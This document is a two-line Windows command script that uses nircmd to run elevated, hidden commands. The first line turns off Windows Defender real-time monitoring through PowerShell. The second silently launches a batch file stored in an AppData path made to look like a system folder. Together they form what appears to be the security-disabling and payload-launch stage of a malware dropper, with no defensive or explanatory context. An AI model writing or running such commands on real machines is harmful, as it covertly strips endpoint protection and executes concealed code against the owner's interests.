nircmd elevatecmd exec hide powershell.exe -command "Set-MpPreference -DisableRealtimeMonitoring $true"
nircmd elevatecmd exec hide "%AppData%\Microsoft\Windows\run.bat"